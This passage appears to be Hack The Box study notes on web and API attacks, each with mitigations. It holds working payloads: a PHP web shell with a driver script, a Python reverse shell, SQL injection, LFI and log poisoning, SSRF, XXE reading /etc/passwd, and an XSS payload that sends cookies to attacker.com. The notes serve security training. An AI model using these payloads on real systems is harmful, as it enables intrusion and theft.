            Deny from all
        </Files>
        ```
        
2. **Implement Brute-Force Protection**:
    - Limit login attempts via plugins like Wordfence or Fail2Ban.
3. **Restrict `pingback.ping` Method**:
    - Use plugins to disable this specific XML-RPC method.
4. **Update WordPress and Plugins**:
    - Ensure WordPress and plugins are updated to mitigate known vulnerabilities.

---

# API Attacks

## Information Disclosure (with a twist of SQLi)

- **Information Disclosure**: Occurs due to insecure API design or misconfigurations.
- **Fuzzing**: Helps uncover hidden parameters or endpoints that reveal sensitive information.

---

### **Step-by-Step Process**

### **1. Parameter Fuzzing with `ffuf`**

```bash
ffuf -w "/usr/share/seclists/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs <number we found>
```

- **Discovered Parameter**:
    - Parameter `id` revealed data when tested:
        
        ```bash
        curl http://<TARGET IP>:3003/?id=1
        # response
        [{"id":"1","username":"admin","position":"1"}]
        ```
        

---

### **2. Automating Enumeration**

- **Python Script** (`brute_api.py`):
    
    ```python
    import requests
    
    def brute_force_ids(base_url, start_id=1, end_id=100):
        for i in range(start_id, end_id + 1):
            try:
                response = requests.get(f"{base_url}/?id={i}")
                if response.status_code == 200 and response.text.strip():
                    print(f"[+] ID {i} - Response: {response.text}")
            except requests.RequestException as e:
                print(f"[-] Error for ID {i}: {e}")
    
    if __name__ == "__main__":
        base_url = "http://10.129.11.251:3003"
        brute_force_ids(base_url, start_id=1, end_id=100)
    ```
    
    - Adjust the `start_id` and `end_id` values as needed.
    - Add conditions to filter specific results (e.g., searching for `position`).
- **Execution**:
    
    ```bash
    python brute_api.py                            
    [+] ID 1 - Response: [{"id":"1","username":"admin","position":"1"}]
    [+] ID 2 - Response: [{"id":"2","username":"HTB-User-John","position":"2"}]
    [+] ID 3 - Response: [{"id":"3","username":"WebServices","position":"3"}]
    [+] ID 4 - Response: []
    [+] ID 5 - Response: []
    [+] ID 6 - Response: []
    [+] ID 7 - Response: []
    [+] ID 8 - Response: []
    ```
    

---

### **Rate Limiting Bypass**

- **Techniques**:
    - Use headers like `X-Forwarded-For` or `X-Forwarded-IP` etc. to spoof source IP:
        
        ```bash
        curl -H "X-Forwarded-For: 127.0.0.1" http://<TARGET IP>:3003/?id=1
        ```
        
    - Example whitelist bypass in PHP:
        
        ```php
        <?php
        $whitelist = array("127.0.0.1", "1.3.3.7");
        if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
        {
            header("HTTP/1.1 401 Unauthorized");
        }
        else
        {
          print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
        }
        ```
        
        The issue here is that the code compares the *HTTP_X_FORWARDED_FOR* header to the possible *whitelist* values, and if the *HTTP_X_FORWARDED_FOR* is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the *X-Forwarded-For* header and the value to one of the IPs from the array.
        

---

### **Information Disclosure via SQL Injection**

- **Identified Parameter**: `id`.
- **Testing for SQLi**:
    - Submit classic SQLi payloads:
        
        ```bash
        http://10.129.202.133:3003/?id='OR 1=1' OR 1
        # ecnoding it : 
        curl -s -w "\n" http://10.129.202.133:3003/?id=%27OR%201%3D1%27%20OR%201 | jq
        
        # Or we can use SQLMap
        sqlmap -u "http://10.129.11.251:3003/?id=1" --dump -p id --batch
        ##
        [20:59:55] [INFO] fetching entries for table 'users' in database 'htb'
        Database: htb
        Table: users
        [4 entries]
        +---------+--------------------------------+------------+
        | id      | username                       | position   |
        +---------+--------------------------------+------------+
        | 1       | admin                          | 1          |
        | 2       | HTB-User-John                  | 2          |
        | 3       | WebServices                    | 3          |
        | 8374932 | HTB{THE_FL4G_FOR_SQLI_IS_H3RE} | 736373     |
        +---------+--------------------------------+------------+
        ```
        
    - **`s` (silent mode):** Suppresses the progress bar and error messages for a cleaner output.
    - **`w "\n"`:** Ensures a newline character (`\n`) is added after the output, which is useful when piping data to other tools like `jq`.

---

## **Arbitrary File Upload to Remote Code Execution (RCE)**

---

### **Overview**

- **Arbitrary File Upload** vulnerabilities allow attackers to upload malicious files, execute arbitrary commands, and potentially compromise the back-end server.
- This attack applies to web applications and APIs that fail to validate or sanitize uploaded files.

---

### **Exploit Scenario**

### **1. Identifying File Upload Functionality**

- Target URL: `http://<TARGET IP>:3001`
- Observed functionality:
    - Anonymous file upload via `/api/upload/`.
    - No restrictions on:
        - File extensions (e.g., `.php` allowed).
        - Content types (e.g., `application/x-php` accepted).

### **2. Malicious PHP File**

- Create a PHP backdoor (`backdoor.php`):
    
    ```php
    <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
    ```
    
- Upload the file using the vulnerable upload endpoint.
- The server provides the storage location of the uploaded file:

```
http://<TARGET IP>:3001/uploads/backdoor.php
#
Your file is uploaded to /uploads/backdoor.php
```

![image.png](image%20167.png)

- The content type has been automatically set to `application/x-php`, which means there is no protection in place. The content type would probably be set to `application/octet-stream` or `text/plain` if there was one.

### **Leveraging the Backdoor**

### **3. Initial Command Execution**

- Access the uploaded backdoor:
    
    ```bash
    http://<TARGET IP>:3001/uploads/backdoor.php?cmd=id
    #
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

### **4. Automating with a Python Script**

- **Interactive Web Shell Script** (`web_shell.py`):
    
    ```python
    import argparse, time, requests, os
    
    parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs")
    parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True)
    parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload")
    parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes")
    args = parser.parse_args()
    
    if args.target == None and args.payload == None:
        parser.print_help()
    elif args.target and args.payload:
        print(requests.get(args.target + "/?cmd=" + args.payload).text)
    if args.target and args.option == "yes":
        os.system("clear")
        while True:
            try:
                cmd = input("$ ")
                print(requests.get(args.target + "/?cmd=" + cmd).text)
                time.sleep(0.3)
            except requests.exceptions.InvalidSchema:
                print("Invalid URL Schema: http:// or https://")
            except requests.exceptions.ConnectionError:
                print("URL is invalid")
    ```
    

### **5. Usage**

- Interactive shell:
    
    ```bash
    python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
    #
    $ id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

---

### **Escalating to a Reverse Shell**

### **6. Reverse Shell Payload**

- Execute the following payload in the interactive shell:
    
    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
    ```
    
- Ensure a Netcat listener is active on your machine:
    
    ```bash
    nc -lvnp <LISTENER PORT>
    ```
    

---

### **Mitigation**

1. **Validate File Uploads**:
    - Restrict allowed file extensions to non-executable types (e.g., `.jpg`, `.png`).
    - Verify the content type and scan uploaded files.
2. **Rename Uploaded Files**:
    - Change uploaded file names to random values without exposing the original name or extension.
3. **Prevent Code Execution**:
    - Store uploaded files outside the web root.
    - Disable execution of uploaded files.
4. **Use Content-Type Validation**:
    - Reject files with content types like `application/x-php`.
5. **Implement Proper Permissions**:
    - Restrict server write permissions and enforce `read-only` for uploaded files.

---

## Local File Inclusion (LFI)

- **LFI** is a vulnerability that allows an attacker to read (and sometimes execute) files on the server by manipulating file path inputs.
- Web applications and APIs are both susceptible, especially when file paths are not validated or sanitized.

---

### **Step-by-Step Process**

### **1. Initial Interaction**

- Target API endpoint: `http://<TARGET IP>:3000/api`.
- First request:
    
    ```bash
    curl http://<TARGET IP>:3000/api
    #
    {"status":"UP"}
    ```
    
- Indicates the API is functional but provides no further information.

---

### **2. Fuzzing for Hidden Endpoints**

- Use `ffuf` to discover additional endpoints:
    
    ```bash
    ffuf -w "/usr/share/seclists/SecLists-master/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://10.129.202.191:3000/api/FUZZ'
    # endpoint
    /api/download [Status: 200, Size: 71]
    
    ```
    

---

### **3. Testing the Discovered Endpoint**

- Request the `/api/download` endpoint:
    
    ```bash
    curl http://<TARGET IP>:3000/api/download
    #
    {"success":false,"error":"Input the filename via /download/<filename>"}
    ```
    
- Requires a filename to proceed.

---

### **4. Exploiting LFI**

- Attempt to read a sensitive file (e.g., `/etc/hosts`) by manipulating the `filename` parameter with directory traversal:
    
    ```bash
    curl http://10.129.202.191:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts      
    127.0.0.1 localhost
    127.0.1.1 nix01-websvc
    
    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ```
    
    - **URL Encoding**: `%2f` represents `/`.
- Confirms the API is vulnerable to LFI.

---

### **Potential Exploitation Paths**

### **1. Reading Sensitive Files**

- **Example Files**:
    - `/etc/passwd`: User account details.
        
        ```bash
        curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd"
        ```
        
    - Application config files:
        - `/var/www/html/config.php`
        - `/var/www/html/.env`
- Look for sensitive data like credentials, API keys, or database connection details.

### **2. Apache Log Poisoning**

- Poison server logs by injecting PHP code via HTTP headers:
    
    ```bash
    curl -H "User-Agent: <?php system($_GET['cmd']); ?>" http://<TARGET IP>
    ```
    
- Then include the poisoned log file:
    
    ```bash
    curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log?cmd=id"
    ```
    

---

### **Mitigation**

1. **Validate and Sanitize Inputs**:
    - Restrict directory traversal (`../`) and use whitelists for file paths.
    - Normalize file paths before processing.
2. **Limit File Access**:
    - Restrict access to only the required files using server permissions.
    - Store downloadable files outside the web root.
3. **Disable Detailed Errors**:
    - Avoid revealing implementation details in API responses.
4. **Use a Web Application Firewall (WAF)**:
    - Block malicious patterns such as `../`.

---

## Cross-Site Scripting in API’s

- **XSS Vulnerabilities**: Allow attackers to inject and execute arbitrary JavaScript code in a victim's browser.
- **Impact**:
    - Theft of sensitive information (e.g., cookies, tokens).
    - Phishing attacks or defacement.
    - Full web application compromise when combined with other vulnerabilities.

---

### **Exploitation Scenario**

**Target API**: `http://<TARGET IP>:3000/api/download`

---

### **1. Initial Interaction**

- Test the API with a placeholder parameter:
    
    ```bash
    curl http://<TARGET IP>:3000/api/download/test_value
    ```
    
- Response:
    - The value `test_value` is reflected in the output.

---

### **2. Testing for XSS**

- Inject a basic XSS payload:
    
    ```jsx
    <script>alert(document.domain)</script>
    #
    Cannot GET /api/download/%3Cscript%3Ealert(document.domain)%3C/script%3E
    ```
    
- **Response**:
    - The payload is encoded and not executed, indicating some sanitization is in place.

---

### **3. URL-Encoding the Payload**

- Encode the payload to bypass sanitization:
    
    ```jsx
    %3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    ```
    
- Submit the encoded payload:
    
    ```bash
    curl "http://<TARGET IP>:3000/api/download/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
    ```
    

![image.png](image%20168.png)

- **Result**:
    - The JavaScript payload is executed in the browser, showing a pop-up with the domain name.
    - Confirms that the API is vulnerable to **Reflected XSS**.

---

### **Exploitation Impact**

- **Stealing Cookies**:
    - Use JavaScript to capture and exfiltrate session cookies:
        
        ```jsx
        <script>document.location='http://attacker.com/?cookie='+document.cookie</script>
        ```
        
- **Phishing Attack**:
    - Redirect users to a malicious page:
        
        ```jsx
        <script>document.location='http://malicious-site.com'</script>
        ```
        
- **Defacement**:
    - Alter the webpage's content:
        
        ```jsx
        <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
        ```
        

---

### **Mitigation**

1. **Input Validation**:
    - Reject dangerous inputs and implement a whitelist for allowed characters.
2. **Output Encoding**:
    - Use context-specific encoding:
        - HTML: Encode `<`, `>`, `&`.
        - JavaScript: Escape quotes and backslashes.
    - Example:
        
        ```html
        &lt;script&gt;alert(document.domain)&lt;/script&gt;
        ```
        
3. **Content Security Policy (CSP)**:
    - Enforce a strict CSP to prevent unauthorized script execution:
        
        ```
        Content-Security-Policy: script-src 'self';
        ```
        
4. **Disable Detailed Error Messages**:
    - Avoid reflecting user input in error responses.
5. **HTTPOnly Cookies**:
    - Mark cookies as `HttpOnly` to prevent access via JavaScript.
6. **Sanitization Libraries**:
    - Use libraries like DOMPurify for robust sanitization.

---

## **Server-Side Request Forgery (SSRF) Attack**

- **SSRF**: Server-Side Request Forgery vulnerabilities allow attackers to abuse server functionality to:
    - Interact with internal/external resources.
    - Access internal systems, files, or services.
    - Perform port scans and leak sensitive data.
    - Achieve remote code execution (RCE) in advanced scenarios.

---

### **Exploitation Steps**

### **1. Target API Interaction**

- **Target Endpoint**: `http://<TARGET IP>:3000/api/userinfo`
- **Initial Interaction**:
**Response**:
    
    ```bash
    curl http://<TARGET IP>:3000/api/userinfo
    #
    {"success":false,"error":"'id' parameter is not given."}
    ```
    
    - Indicates the API expects an `id` parameter.

---

### **2. Setting Up the Environment**

- **Netcat Listener**:
    - Set up a listener to capture connections: **`nc -nlvp 4444`**

---

### **3. Attempting SSRF**

- **Initial Attempt**:
    - Supply a URL to the `id` parameter:
        
        ```bash
        curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:4444"
        #
        {"success":false,"error":"'id' parameter is invalid."}
        
        ```
        
    - We notice an error about the **`*id*`** parameter being invalid, and we also notice no connection being made to our listener.

---

### **4. Bypassing Input Validation**

- **Base64-Encoding the URL**:
    - Encode the URL for the listener:
    **Example Output**:
        
        ```bash
        echo "http://10.10.15.130:4444" | tr -d '\n' | base64 
        #                                                                                             
        aHR0cDovLzEwLjEwLjE1LjEzMDo0NDQ0
        ```
        
    - **API Call with Encoded Parameter**:
        
        ```bash
        curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
        ```
        

---

### **5. Observing the SSRF**

- **Netcat Listener Output**:
    
    ```
    listening on [any] 4444 ...
    connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
    GET / HTTP/1.1
    Accept: application/json, text/plain, */*
    User-Agent: axios/0.24.0
    Host: <VPN/TUN Adapter IP>:4444
    Connection: close
    ```
    
    - Confirms that the API made a request to the provided URL, indicating an SSRF vulnerability.

---

### **Advanced Exploitation**

- **Interacting with Internal Services**:
    - Use SSRF to access internal resources (e.g., metadata services, databases):
        
        ```bash
        curl "http://<TARGET IP>:3000/api/userinfo?id=http://127.0.0.1:80"
        ```
        
- **Port Scanning**:
    - Probe internal ports:
        
        ```bash
        for port in {1..100}; do
          curl "http://<TARGET IP>:3000/api/userinfo?id=http://127.0.0.1:$port";
        done
        ```
        
- **File Inclusion**:
    - Fetch local files:
        
        ```bash
        curl "http://<TARGET IP>:3000/api/userinfo?id=file:///etc/passwd"
        ```
        
- **Exfiltrating Sensitive Data**:
    - Leak internal information to your controlled server:
        
        ```bash
        curl "http://<TARGET IP>:3000/api/userinfo?id=http://<YOUR_SERVER>/data"
        ```
        

---

### **Mitigation**

1. **Input Validation**:
    - Validate URLs rigorously (e.g., only allow whitelisted domains).
2. **Restrict Outbound Requests**:
    - Limit server-side network access to trusted resources.
3. **Block Internal Access**:
    - Implement network-level controls (e.g., firewalls) to prevent access to internal systems.
4. **Logging and Monitoring**:
    - Log all outbound requests and monitor for unusual patterns.
5. **Timeouts and Rate Limits**:
    - Prevent prolonged or frequent requests to mitigate abuse.

---

## **Regular Expression Denial of Service (ReDoS) Attack**

### **Overview**

- **ReDoS**: A denial-of-service attack that exploits inefficiencies in regular expression engines to cause excessive resource consumption (CPU time).
- **Cause**: Inefficient or poorly written regex patterns, particularly when handling nested quantifiers or catastrophic backtracking.
- **Impact**: Crafted payloads can exponentially increase the processing time, leading to delayed responses or API downtime.

---

### **Target API**

- **Endpoint**: `http://<TARGET IP>:3000/api/check-email`
- **Parameter**: `email`
- **Regex Pattern**:
    
    ```
    /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/
    #
    ^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$
    ```
    

---

### **Exploit Process**

### **1. Initial Interaction**

- Submit a simple payload to confirm functionality:
    
    ```bash
    curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
    #
    {"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
    ```
    

### **2. Analyze the Regex**

- Tools for analysis:
    - **regex101.com**: Provides an explanation of the regex.
    - **jex.im/regulex**: Visualizes the regex structure.
- **Regex Analysis**:
    - The second group `(([a-zA-Z0-9-])+.)` and the third group `([a-zA-Z0-9]{2,4})` are prone to **catastrophic backtracking** due to overlapping nested quantifiers (`+` and `{n,m}`).

---

### **3. Crafting a Malicious Payload**

- Test with an overly long email value:
    
    ```bash
    curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
    ```
    
- **Observation**:
    - The response time increases significantly compared to the initial simple payload.
    - Longer input strings exponentially increase evaluation time, confirming the API is vulnerable to ReDoS.

---

### **Why the API is Vulnerable**

- **Regex Inefficiency**:
    - Groups with overlapping quantifiers (`+` and `{n,m}`) result in **catastrophic backtracking**.
    - Each failed match forces the regex engine to backtrack and retry matching, consuming excessive CPU cycles.

---

### **Mitigation**

1. **Regex Optimization**:
    - Simplify regex patterns to avoid overlapping quantifiers.
    - Example: Replace inefficient patterns like:
    
    with more efficient, precise ones.
        
        ```
        (([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+
        ```
        
2. **Input Validation**:
    - Limit the length of user input for parameters like `email`.
3. **Timeouts**:
    - Set execution timeouts for regex evaluations to avoid long-running processes.
4. **Monitoring**:
    - Implement monitoring to detect unusually high API response times, which could indicate ReDoS attacks.
5. **Rate Limiting**:
    - Use rate limiting to prevent attackers from submitting a large volume of requests.

---

## XML External Entity (XXE) Injection

- **XXE Injection**: Exploits how XML parsers process external entities, allowing attackers to:
    - Read internal server files.
    - Perform SSRF (Server-Side Request Forgery) attacks.
    - Leak sensitive information or cause denial of service.
- **Impact**: Disclose sensitive data, internal services, and even execute remote code in some scenarios.

---

### **Target Application**

- **Endpoint**: `http://<TARGET IP>:3001/api/login`
- **Input Format**: XML

---

### **Step-by-Step Exploitation**

### **1. Initial Interaction**

- Burp:
    
    ![image.png](image%20169.png)
    
- 
    
    ```bash
    POST /api/login/ HTTP/1.1
    Host: 10.129.201.133:3001
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 95
    Origin: http://10.129.201.133:3001
    Connection: keep-alive
    Referer: http://10.129.201.133:3001/
    
    <?xml version="1.0" encoding="UTF-8"?><root><email>test</email><password>test</password></root>
    ```
    
    - We notice that an API is handling the user authentication functionality of the application.
    - User authentication is generating XML data.

---

### **2. Adding a DOCTYPE Declaration/Payload**

- Craft a payload to include a DOCTYPE declaration with an external entity definition:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
    <root>
    <email>test@test.com</email>
    <password>P@ssw0rd123</password>
    </root>
    ```
    
    - **Explanation**:
        - Defines a DTD (document type definition) `pwn`.
        - We have called our external entity *somename*, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.

---

### **3. Setting Up a Listener**

- Start a **Netcat listener** to capture incoming connections: **`nc -nlvp 4444`**

---

### **4. Submitting the Payload**

- Submit the payload via the API:
    
    ```bash
    curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
    <p>Sorry, we cannot find a account with <b></b> email.</p>
    ```
    
    - We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.
    - **Change**:
        - Replaced the email value with the external entity `&somename;` to trigger its usage.
    
    ```bash
    curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
    ```
    
    After the call to the API, you will notice a connection being made to the listener.
    

---

### **5. Observing the Connection**

- Check the Netcat listener:
    
    ```
    connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
    GET / HTTP/1.0
    Host: <VPN/TUN Adapter IP>:4444
    Connection: close
    ```
    
    - Confirms that the server fetched the external entity, proving vulnerability to XXE Injection.

---

### **Advanced XXE Exploitation**

### **Reading Server Files**

- Modify the entity to fetch internal files using the `file://` URI scheme:
    
    ```xml
    <!DOCTYPE pwn [<!ENTITY file SYSTEM "file:///etc/passwd">]>
    ```
    
- Use the entity to read the file:
    
    ```bash
    curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY file SYSTEM "file:///etc/passwd"> ]><root><email>&file;</email><password>P@ssw0rd123</password></root>'
    ```
    

### **SSRF via XXE**

- Point the external entity to an internal resource (e.g., `http://127.0.0.1:3000`):
    
    ```xml
    <!DOCTYPE pwn [<!ENTITY ssrf SYSTEM "http://127.0.0.1:3000">]>
    ```
    
- Submit the payload:
    
    ```bash
    curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY ssrf SYSTEM "http://127.0.0.1:3000"> ]><root><email>&ssrf;</email><password>P@ssw0rd123</password></root>'
    ```
    

---

### **Mitigation**

1. **Disable DTDs**:
    - Configure the XML parser to disable external entity processing:
        
        ```python
        parser = lxml.etree.XMLParser(resolve_entities=False)
        ```
        
2. **Use Safe XML Libraries**:
    - Use libraries like `defusedxml` to prevent XXE vulnerabilities.
3. **Input Validation**:
    - Reject XML input that includes `<!DOCTYPE>` or external entity definitions.
4. **Restrict Outbound Requests**:
    - Block unnecessary outbound traffic to prevent external resource fetching.
5. **Monitor and Log**:
    - Monitor server logs for unexpected requests or file access attempts.

---